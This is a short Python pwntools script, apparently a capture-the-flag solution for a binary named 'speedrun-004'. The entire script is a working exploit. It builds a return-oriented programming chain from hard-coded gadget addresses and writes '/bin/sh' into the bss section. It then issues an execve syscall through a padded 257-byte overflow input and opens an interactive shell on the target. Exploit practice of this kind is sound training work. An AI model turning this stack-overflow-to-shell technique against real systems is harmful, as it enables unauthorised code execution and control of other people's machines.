from pwn import *

target = process('./speedrun-004')

# gdb.attach(target, gdbscript='b *0x00400bb4')

mov = p64(0x47f521) # mov qword ptr [rsi], rax ; ret
rax = p64(0x415f04) # pop rax ; ret
rdi = p64(0x400686) # pop rdi ; ret
rsi = p64(0x410a93) # pop rsi ; ret
rdx = p64(0x44a155) # pop rdx ; ret
syscall = p64(0x40132c) # syscall

binsh = p64(0x68732f6e69622f) # /bin/sh in LSB
bss = p64(0x6b6030) # bss address to which we will write /bin/sh

ret = p64(0x400416) # gadget to a simple ret instruction

payload = b''

# write /bin/sh to bss
payload += rsi
payload += bss
payload += rax
payload += binsh
payload += mov

# prepare the call to execve
payload += rax
payload += p64(0x3b)
payload += rdi
payload += bss
payload += rsi
payload += p64(0x0)
payload += rdx
payload += p64(0x0)

# do the syscall
payload += syscall

# pad the beginning with 0s
payload = ret * ((256 - len(payload)) // 8) + payload + b'\x00'

target.sendline('257')
target.recvuntil('Ok, what do you have to say for yourself?')
target.send(payload)

target.interactive()